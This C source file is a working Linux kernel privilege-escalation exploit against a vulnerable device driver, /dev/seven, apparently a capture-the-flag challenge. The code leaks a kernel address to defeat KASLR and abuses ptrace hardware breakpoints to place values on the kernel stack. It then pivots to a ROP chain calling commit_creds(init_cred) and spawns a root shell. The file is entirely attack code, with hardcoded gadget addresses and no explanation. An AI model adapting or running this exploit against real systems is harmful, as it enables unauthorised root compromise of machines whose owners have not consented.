#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
 
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sched.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/ptrace.h>

#define DR_OFFSET(idx) ((void*)(&(((struct user*)0)->u_debugreg[idx])))
size_t swapgs_kpti = 0xFFFFFFFF82000F01;
size_t init_cred =  0xffffffff82a4cbf8;
size_t commit_creds = 0xffffffff810bb5b0;
size_t pop_rdi = 0xffffffff81002c9d; // pop rdi ; ret

int fd;
pid_t pid;
int status;
char buf[4];
size_t kernel_offset;

size_t leak(size_t addr) { return ioctl(fd, 0x5555, addr); }
void set_rsp(size_t rsp) { ioctl(fd, 0x6666, rsp); }

void err_exit(char *msg)
{
    printf("\033[31m\033[1m[x] Error at: \033[0m%s\n", msg);
    sleep(5);
    exit(EXIT_FAILURE);
}

void info(char *msg)
{
    printf("\033[32m\033[1m[+] %s\n\033[0m", msg);
}

void hexx(char *msg, size_t value)
{
    printf("\033[32m\033[1m[+] %s: %#lx\n\033[0m", msg, value);
}

void bind_core(int core)
{
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    printf("\033[34m\033[1m[*] Process binded to core \033[0m%d\n", core);
}

void set_hbp(void *addr)
{
	if (ptrace(PTRACE_POKEUSER, pid, DR_OFFSET(0), addr) == -1)
	{
		printf("Failed to set dr_0\n");
		kill(pid, 9);
		exit(-1);
	}
	unsigned long dr_7 = (1<<0)|(1<<8)|(1<<16)|(1<<17)|(1<<18)|(1<<19);
	if (ptrace(PTRACE_POKEUSER, pid, DR_OFFSET(7), dr_7) == -1)
	{
		printf("Failed to set dr_7\n");
		kill(pid, 9);
		exit(-1);
	}
}


int main(int argc, char **argv, char **env)
{
	fd = open("/dev/seven", O_RDWR);
	if (fd < 0) err_exit("Open dev file");
	kernel_offset = (leak(0xfffffe0000000000+4)&0xffffffff) - 0x82008e00;
	hexx("kernel_offset", kernel_offset);
	swapgs_kpti += kernel_offset;
	init_cred += kernel_offset;
	commit_creds += kernel_offset;
	pop_rdi += kernel_offset;

	pid = fork();
	if (!pid)
	{
		bind_core(0);
		ptrace(PTRACE_TRACEME, 0, NULL, NULL);
		raise(SIGSTOP);
		__asm__ volatile(
		"mov rax, pop_rdi;"
		"mov rcx, init_cred;"
		"mov rdx, commit_creds;"
		"mov rsi, swapgs_kpti;"
		);		
		buf[0] = 1;
		set_rsp(0xfffffe0000010fa8);
		hexx("UID", getuid());
		system("/bin/sh");
		exit(0);
	}

	waitpid(pid, &status, 0);
	set_hbp(buf);
	
	ptrace(PTRACE_CONT, pid, NULL, NULL);
	waitpid(pid, &status, 0);
	
	ptrace(PTRACE_CONT, pid, NULL, NULL);
	waitpid(pid, &status, 0);
	return 0;
}
